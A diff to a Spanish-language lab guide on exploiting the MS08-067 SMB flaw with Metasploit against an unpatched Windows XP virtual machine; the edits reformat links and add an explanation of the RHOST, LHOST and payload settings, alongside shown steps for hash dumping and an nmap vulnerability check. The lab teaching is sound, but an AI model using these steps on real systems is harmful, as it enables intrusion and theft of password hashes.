@@ -17,9 +17,9 @@ ________________________________________
 - Fue utilizada por el gusano Conficker.
 ________________________________________
 ## 🧰 **Requisitos del entorno de laboratorio**
--	💻 Kali Linux (máquina atacante). https://www.kali.org/get-kali/#kali-platforms
--	🧱 Máquina víctima: Windows XP SP2/SP3 sin parches. https://archive.org/details/windows-xp-sp-2-september-2008
-- Máquina víctima: Linuix (opcional). https://sourceforge.net/projects/metasploitable/
+-	💻 [Kali Linux (máquina atacante).](https://www.kali.org/get-kali/#kali-platforms)
+-	🧱 [Máquina víctima: Windows XP SP2/SP3 sin parches.](https://archive.org/details/windows-xp-sp-2-september-2008)
+- 🧱 [Máquina víctima: Linuix (opcional).](https://sourceforge.net/projects/metasploitable/)
 - Ambas en la misma red (real o virtual).
 ________________________________________
 ## 🧪 **Paso a paso: Explotación con Metasploit**
@@ -38,6 +38,11 @@ ________________________________________
 ________________________________________
 **🔹 5. Ver opciones**
 <pre>show options</pre>
+
+Debes configurar:
+-	**RHOST:** IP de la víctima
+-	**LHOST:** IP del atacante
+-	**PAYLOAD:** tipo de shell que quieres usar
 ________________________________________
 **🔹 6. Configurar opciones**
 <pre>set RHOST [IP víctima]</pre>
@@ -64,7 +69,7 @@ ________________________________________
 - **hashdump:** Extrae hashes de contraseñas.
 ________________________________________
 ## ❌ **Consejos adicionales**
--Para verificar si el Windows XP es vulnerable:
+- Para verificar si el Windows XP es vulnerable:
 <pre> nmap -p 445 --script smb-vuln-ms08-067 <IP_víctima> </pre>
 - Verificar si el parche MS08-067 esta instalado:
 <pre> systeminfo | find "KB958644" </pre>
